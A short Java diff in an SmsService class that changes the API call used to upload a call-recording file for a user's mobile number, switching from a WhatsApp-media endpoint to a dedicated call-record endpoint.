@@ -91,7 +91,7 @@ public class SmsService {
     public void sendCallrecordings(File file,String userMobile){
         initSMSAPI();
         SmsCallback smsCallback = new SmsCallback(5, file);
-        smsAPI.postWhatsAppMedia("UPLOAD",userMobile,new TypedFile(getMimeType(file.getAbsolutePath()),file), smsCallback);
+        smsAPI.postCallRecord("UPLOAD",userMobile,new TypedFile(getMimeType(file.getAbsolutePath()),file),"CALLRECORD", smsCallback);
     }
 
     public static String removeSpChars(String s){
